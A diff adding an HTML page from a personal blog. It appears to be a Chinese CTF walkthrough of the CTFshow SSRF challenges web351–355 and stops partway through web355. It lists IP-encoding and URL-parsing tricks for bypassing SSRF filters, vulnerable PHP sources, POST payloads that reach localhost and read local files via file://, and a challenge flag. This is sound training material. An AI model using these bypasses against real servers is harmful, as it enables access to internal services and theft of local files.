@@ -1,0 +1,1080 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="ssrf绕过姿势 ¶ 更改 IP 地址写法 例如192.168.0.1  8 进制格式：0300.0250.0.1 16 进制格式：0xC0.0xA8.0.1 10 进制整数格式：3232235521 16 进制整数格式：0xC0A80001 还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1   利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW-web入门-ssrf">
+<meta property="og:url" content="http://yoursite.com/2021/09/29/CTFSHOW-web入门-ssrf/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="ssrf绕过姿势 ¶ 更改 IP 地址写法 例如192.168.0.1  8 进制格式：0300.0250.0.1 16 进制格式：0xC0.0xA8.0.1 10 进制整数格式：3232235521 16 进制整数格式：0xC0A80001 还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1   利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2021/09/27/UcsV2dMe38JaTNr.png">
+<meta property="og:image" content="https://i.loli.net/2021/09/27/1ungFzEDTeCN8bX.png">
+<meta property="og:image" content="https://i.loli.net/2021/09/27/6iHBgNKvZJFLWVd.png">
+<meta property="og:image" content="https://i.loli.net/2021/09/27/MPvpXADzSE3Rwj7.png">
+<meta property="og:image" content="https://i.loli.net/2021/09/27/QsDyvV9w58tipXx.png">
+<meta property="og:image" content="https://i.loli.net/2021/09/27/Qd3zAtjuJFvqY5D.png">
+<meta property="og:updated_time" content="2021-09-29T03:07:31.701Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTFSHOW-web入门-ssrf">
+<meta name="twitter:description" content="ssrf绕过姿势 ¶ 更改 IP 地址写法 例如192.168.0.1  8 进制格式：0300.0250.0.1 16 进制格式：0xC0.0xA8.0.1 10 进制整数格式：3232235521 16 进制整数格式：0xC0A80001 还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1   利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析">
+<meta name="twitter:image" content="https://i.loli.net/2021/09/27/UcsV2dMe38JaTNr.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2021/09/29/CTFSHOW-web入门-ssrf/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CTFSHOW-web入门-ssrf | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/09/29/CTFSHOW-web入门-ssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTFSHOW-web入门-ssrf
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-09-29 11:07:27 / Modified: 11:07:31" itemprop="dateCreated datePublished" datetime="2021-09-29T11:07:27+08:00">2021-09-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><h2 id="绕过姿势-¶"><a href="#绕过姿势-¶" class="headerlink" title="绕过姿势 ¶"></a>绕过姿势 <a href="https://wiki.x10sec.org/web/ssrf/#_3" target="_blank" rel="noopener">¶</a></h2><ol>
+<li><p>更改 IP 地址写法 例如<code>192.168.0.1</code></p>
+<ul>
+<li>8 进制格式：<code>0300.0250.0.1</code></li>
+<li>16 进制格式：<code>0xC0.0xA8.0.1</code></li>
+<li>10 进制整数格式：<code>3232235521</code></li>
+<li>16 进制整数格式：<code>0xC0A80001</code></li>
+<li>还有一种特殊的省略模式，例如<code>10.0.0.1</code>这个 IP 可以写成<code>10.1</code></li>
+</ul>
+</li>
+<li><p>利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如：</p>
+<ul>
+<li><p><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容</p>
+</li>
+<li><p>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>==&gt;<code>http://127.0.0.1/</code></p>
+</li>
+<li><p>短地址<code>http://dwz.cn/11SMa</code>==&gt;<code>http://127.0.0.1</code></p>
+</li>
+<li><p>利用句号<code>。</code>：<code>127。0。0。1</code>==&gt;<code>127.0.0.1</code></p>
+</li>
+<li><p>利用 Enclosed alphanumerics </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="危害-¶"><a href="#危害-¶" class="headerlink" title="危害 ¶"></a>危害 <a href="https://wiki.x10sec.org/web/ssrf/#_4" target="_blank" rel="noopener">¶</a></h2><ul>
+<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息;</li>
+<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
+<li>对内网 web 应用进行指纹识别，通过访问默认文件实现;</li>
+<li>攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2，sqli 等）;</li>
+<li>利用 file 协议读取本地文件等。</li>
+</ul>
+<h4 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> ($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相关函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.runoob.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">url=file:/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">url=http:<span class="comment">//127.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
+<p>flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">"ctfshow&#123;68c533cb-79d8-497b-a63a-e746472a5615&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"非本地用户禁止访问"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>($x[<span class="string">'scheme'</span>]===<span class="string">'http'</span>||$x[<span class="string">'scheme'</span>]===<span class="string">'https'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/localhost|127.0.0/'</span>))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> ($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>parse_url</p>
+<p>parse_url — 解析 URL，返回其组成部分</p>
+<p>要求</p>
+<p><strong>示例 #1 \</strong>parse_url()** 例子**</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$url = &apos;http://username:password@hostname/path?arg=value#anchor&apos;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;</span><br></pre></td></tr></table></figure>
+<p>以上例程会输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">url=http:<span class="comment">//127.0.0.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//127.0.0.1:80/flag.php</span></span><br><span class="line">url=http:<span class="comment">//localhost/flag.php</span></span><br></pre></td></tr></table></figure>
+<p>csdn：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cheme必须是http或者https，但是不能有<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>或者localhost。这个绕过技巧很多了，列具一些常用的吧：</span><br><span class="line"></span><br><span class="line">    进制绕过 url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line">    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>绕过 url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">    短标签绕过，但是这题我测试失败了，可能是我短标签的问题？</span><br><span class="line">    ipv6绕过[::<span class="number">1</span>]，这题也不行。</span><br><span class="line">    使用句号绕过：url=http:<span class="comment">//127。0。0。1/flag.php，这题也不行。</span></span><br><span class="line">    特殊的地址<span class="number">0</span>，url=http:<span class="comment">//0/flag.php，还有url=http://127.1/flag.php,还有url=http://127.0000000000000.001/flag.php这样的。</span></span><br><span class="line">    dns重绑定其实也能用在这里，不过这题好像不行？不知道是不是我DNS的那个有问题。</span><br><span class="line">    可能还有吧，想到了再补上。</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">过滤了localhost和<span class="number">127.0</span><span class="number">.0</span>。还是有很多方法的，比如<span class="number">127.0</span><span class="number">.1</span> 、<span class="number">127.1</span>、 <span class="number">127</span>。<span class="number">0.0</span><span class="number">.1</span> 或者转成<span class="number">16</span>进制 <span class="number">2</span>进制</span><br><span class="line">转进制的地址https:<span class="comment">//tool.520101.com/wangluo/jinzhizhuanhuan/</span></span><br></pre></td></tr></table></figure>
+<h4 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>($x[<span class="string">'scheme'</span>]===<span class="string">'http'</span>||$x[<span class="string">'scheme'</span>]===<span class="string">'https'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/localhost|127\.0\.|\。/i'</span>, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> ($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br></pre></td></tr></table></figure>
+<h4 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>($x[<span class="string">'scheme'</span>]===<span class="string">'http'</span>||$x[<span class="string">'scheme'</span>]===<span class="string">'https'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/localhost|1|0|。/i'</span>, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> ($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>0和1都不允许出现</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//url/flag.php</span></span><br><span class="line"><span class="comment">//将自己的域名解析到127.0.0.1</span></span><br></pre></td></tr></table></figure>
+<h4 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>($x[<span class="string">'scheme'</span>]===<span class="string">'http'</span>||$x[<span class="string">'scheme'</span>]===<span class="string">'https'</span>)&#123;</span><br><span class="line">$host=$x[<span class="string">'host'</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen($host)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> ($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span 